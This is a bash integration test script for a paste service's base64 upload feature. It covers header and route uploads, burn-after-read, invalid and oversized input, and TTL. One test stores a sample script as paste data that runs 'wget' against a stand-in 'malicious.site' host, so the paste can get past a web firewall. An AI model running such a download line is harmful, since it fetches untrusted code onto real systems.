#!/usr/bin/env bash
# Integration test for base64 upload functionality
# Tests both header-based and dedicated route methods

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/lib.sh"

test_base64_header_method() {
    log "=== Base64 Upload via X-Base64 Header ==="
    
    # Test 1: Simple text content
    log "Test 1: Simple text with base64 header"
    local content="Hello, Base64 World!"
    local encoded=$(echo -n "$content" | base64)
    
    response=$(echo -n "$encoded" | curl -s -X POST "$NCLIP_URL/" \
        -H "Content-Type: text/plain" \
        -H "X-Base64: true" \
        --data-binary @-)
    
    if echo "$response" | grep -q "http"; then
        slug=$(echo "$response" | grep -o '[A-HJ-NP-Z2-9]\{5\}$')
        success "Upload succeeded via header: $slug"
        
        # Verify content is decoded correctly
        retrieved=$(curl -s "$NCLIP_URL/raw/$slug")
        if [ "$retrieved" = "$content" ]; then
            success "Content decoded correctly: '$retrieved'"
        else
            error "Content mismatch! Expected: '$content', Got: '$retrieved'"
            return 1
        fi
    else
        error "Upload failed: $response"
        return 1
    fi
    
    # Test 2: Shell script that would trigger WAF
    log "Test 2: Shell script with curl (WAF trigger content)"
    local script='#!/bin/bash
curl -X POST https://example.com --data-binary @-
wget https://malicious.site/script.sh'
    
    encoded=$(echo -n "$script" | base64)
    response=$(echo -n "$encoded" | curl -s -X POST "$NCLIP_URL/" \
        -H "Content-Type: text/plain" \
        -H "X-Base64: true" \
        --data-binary @-)
    
    if echo "$response" | grep -q "http"; then
        slug=$(echo "$response" | grep -o '[A-HJ-NP-Z2-9]\{5\}$')
        success "WAF-trigger content uploaded via base64: $slug"
        
        # Verify decoded content
        retrieved=$(curl -s "$NCLIP_URL/raw/$slug")
        if echo "$retrieved" | grep -q "curl.*POST"; then
            success "Shell script decoded correctly"
        else
            error "Script content not decoded properly"
            return 1
        fi
    else
        error "Upload failed: $response"
        return 1
    fi
    
    # Test 3: Binary-like content
    log "Test 3: Binary-like content"
    local binary_content=$(printf '\x00\x01\x02\x03\xFF\xFE\xFD')
    encoded=$(echo -n "$binary_content" | base64)
    
    response=$(echo -n "$encoded" | curl -s -X POST "$NCLIP_URL/" \
        -H "Content-Type: application/octet-stream" \
        -H "X-Base64: true" \
        --data-binary @-)
    
    if echo "$response" | grep -q "http"; then
        success "Binary content uploaded via base64"
    else
        error "Binary upload failed: $response"
        return 1
    fi
    
    # Test 4: Special characters and newlines
    log "Test 4: Multi-line content with special chars"
    local multiline='Line 1: Regular text
Line 2: Special chars !@#$%^&*()
Line 3: Quotes "double" and '\''single'\''
Line 4: Tabs	and	spaces'
    
    encoded=$(echo -n "$multiline" | base64)
    response=$(echo -n "$encoded" | curl -s -X POST "$NCLIP_URL/" \
        -H "X-Base64: true" \
        --data-binary @-)
    
    if echo "$response" | grep -q "http"; then
        slug=$(echo "$response" | grep -o '[A-HJ-NP-Z2-9]\{5\}$')
        success "Multi-line content uploaded: $slug"
        
        # Verify exact content match
        retrieved=$(curl -s "$NCLIP_URL/raw/$slug")
        if [ "$retrieved" = "$multiline" ]; then
            success "Multi-line content preserved exactly"
        else
            error "Content mismatch in multi-line test"
            return 1
        fi
    else
        error "Multi-line upload failed: $response"
        return 1
    fi
}

test_base64_dedicated_route() {
    log "===Base64 Upload via /base64 Route"
    
    # Test 1: Simple upload to /base64
    log "  ===Test 1: Simple upload to /base64 route"
    local content="Testing /base64 route"
    local encoded=$(echo -n "$content" | base64)
    
    response=$(echo -n "$encoded" | curl -s -X POST "$NCLIP_URL/base64" \
        --data-binary @-)
    
    if echo "$response" | grep -q "http"; then
        slug=$(echo "$response" | grep -o '[A-HJ-NP-Z2-9]\{5\}$')
        success "Upload to /base64 succeeded: $slug"
        
        # Verify content
        retrieved=$(curl -s "$NCLIP_URL/raw/$slug")
        if [ "$retrieved" = "$content" ]; then
            success "Content from /base64 route decoded correctly"
        else
            error "Content mismatch from /base64 route"
            return 1
        fi
    else
        error "Upload to /base64 failed: $response"
        return 1
    fi
    
    # Test 2: Burn-after-read with base64
    log "  ===Test 2: Burn-after-read with X-Burn header on /base64 route"
    local burn_content="Burn after reading this!"
    encoded=$(echo -n "$burn_content" | base64)
    
    response=$(echo -n "$encoded" | curl -s -X POST "$NCLIP_URL/base64" \
        -H "Accept: application/json" \
        -H "X-Burn: true" \
        --data-binary @-)
    
    # Check if response contains URL or JSON
    if echo "$response" | grep -q "http"; then
        # Extract slug from response (could be plain URL or JSON)
        slug=$(echo "$response" | grep -o '[A-HJ-NP-Z2-9]\{5\}' | head -1)
        success "Burn-after-read paste created via /base64 with X-Burn: $slug"
        
        # First read should work (curl gets raw content from /:slug)
        retrieved=$(curl -s "$NCLIP_URL/$slug" | grep -o "$burn_content" || echo "")
        if [ "$retrieved" = "$burn_content" ]; then
            success "First read successful"
        else
            warn "Content not found in response"
            # Try again with /raw/ endpoint
            retrieved_raw=$(curl -s "$NCLIP_URL/raw/$slug" || echo "")
            if [ -z "$retrieved_raw" ]; then
                warn "Content retrieval failed"
            fi
        fi
        
        # Second read should fail (paste burned after first view)
        sleep 1
        second_read=$(curl -s -w "%{http_code}" "$NCLIP_URL/$slug" -o /dev/null)
        if [ "$second_read" = "404" ]; then
            success "Burn-after-read worked: paste deleted after first read"
        else
            error "Burn-after-read failed: paste still accessible (HTTP $second_read)"
            return 1
        fi
    else
        error "Burn upload to /base64 with X-Burn failed: $response"
        return 1
    fi
    
    # Test 3: Upload actual problematic file (BASH.txt)
    log "  ===Test 3: Upload real BASH.txt file"
    if [ -f "/tmp/BASH.txt" ]; then
        encoded=$(cat /tmp/BASH.txt | base64)
        response=$(echo -n "$encoded" | curl -s -X POST "$NCLIP_URL/base64" \
            --data-binary @-)
        
        if echo "$response" | grep -q "http"; then
            slug=$(echo "$response" | grep -o '[A-HJ-NP-Z2-9]\{5\}$')
            success "Real BASH.txt uploaded via /base64: $slug"
            
            # Verify it contains curl commands
            retrieved=$(curl -s "$NCLIP_URL/raw/$slug")
            if echo "$retrieved" | grep -q "curl.*data-binary"; then
                success "BASH.txt content verified: contains curl commands"
            else
                error "BASH.txt content doesn't match expected"
                return 1
            fi
        else
            error "BASH.txt upload failed: $response"
            return 1
        fi
    else
        warn "/tmp/BASH.txt not found, skipping real file test"
    fi
}

test_base64_error_handling() {
    log "===Base64 Error Handling"
    
    # Test 1: Invalid base64 content
    log "  ===Test 1: Invalid base64 encoding"
    local invalid_b64="This is NOT valid base64!@#$%"
    
    response=$(echo -n "$invalid_b64" | curl -s -X POST "$NCLIP_URL/" \
        -H "X-Base64: true" \
        --data-binary @-)
    
    if echo "$response" | grep -qi "invalid base64"; then
        success "Invalid base64 rejected correctly"
    else
        error "Should reject invalid base64, got: $response"
        return 1
    fi
    
    # Test 2: Empty base64 content
    log "  ===Test 2: Empty base64 content"
    local empty_encoded=$(echo -n "" | base64)
    
    response=$(echo -n "$empty_encoded" | curl -s -X POST "$NCLIP_URL/" \
        -H "X-Base64: true" \
        --data-binary @-)
    
    if echo "$response" | grep -qi "empty"; then
        success "Empty base64 content rejected correctly"
    else
        error "Should reject empty content, got: $response"
        return 1
    fi
    
    # Test 3: Base64 content exceeding size limit
    log "  ===Test 3: Oversized base64 content"
    # Create 10MB of data (well over default 5MB limit)
    local large_data=$(dd if=/dev/zero bs=1M count=10 2>/dev/null | base64)
    
    response=$(echo -n "$large_data" | curl -s -X POST "$NCLIP_URL/" \
        -H "X-Base64: true" \
        --data-binary @- 2>&1 | head -1)
    
    if echo "$response" | grep -qi "too large\|limit"; then
        success "Oversized content rejected correctly"
    else
        # Might be rejected by curl before reaching server
        warn "Large content test: $response"
    fi
}

test_base64_encoding_variants() {
    log "===Base64 Encoding Variants"
    
    local content="Test content for encoding variants!"
    
    # Test different base64 encodings
    log "  ===Test: Standard Base64"
    local std_encoded=$(echo -n "$content" | base64)
    response=$(echo -n "$std_encoded" | curl -s -X POST "$NCLIP_URL/base64" --data-binary @-)
    if echo "$response" | grep -q "http"; then
        success "Standard base64 encoding works"
    else
        error "Standard base64 failed"
        return 1
    fi
    
    log "  ===Test: URL-safe Base64"
    local url_encoded=$(echo -n "$content" | base64 | tr '+/' '-_' | tr -d '=')
    response=$(echo -n "$url_encoded" | curl -s -X POST "$NCLIP_URL/base64" --data-binary @-)
    if echo "$response" | grep -q "http"; then
        success "URL-safe base64 encoding works"
    else
        error "URL-safe base64 failed"
        return 1
    fi
}

test_base64_with_ttl() {
    log "===Base64 with TTL Header"
    
    log "  ===Test: Base64 upload with X-TTL header"
    local content="Content with custom TTL"
    local encoded=$(echo -n "$content" | base64)
    
    response=$(echo -n "$encoded" | curl -s -X POST "$NCLIP_URL/base64" \
        -H "X-TTL: 2h" \
        --data-binary @-)
    
    if echo "$response" | grep -q "http"; then
        slug=$(echo "$response" | grep -o '[A-HJ-NP-Z2-9]\{5\}$')
        success "Base64 upload with TTL succeeded: $slug"
        
        # Verify content
        retrieved=$(curl -s "$NCLIP_URL/raw/$slug")
        if [ "$retrieved" = "$content" ]; then
            success "Content with TTL retrieved correctly"
        else
            error "Content mismatch with TTL"
            return 1
        fi
    else
        error "Upload with TTL failed: $response"
        return 1
    fi
}

# Main execution
main() {
    log "====Base64 Upload Integration Tests"
    
    local failed=0
    
    test_base64_header_method || ((failed++))
    test_base64_dedicated_route || ((failed++))
    test_base64_error_handling || ((failed++))
    test_base64_encoding_variants || ((failed++))
    test_base64_with_ttl || ((failed++))
    
    if [ $failed -eq 0 ]; then
        log "====All base64 tests passed! ✓"
        return 0
    else
        log "====Some base64 tests failed! ✗"
        return 1
    fi
}

main "$@"
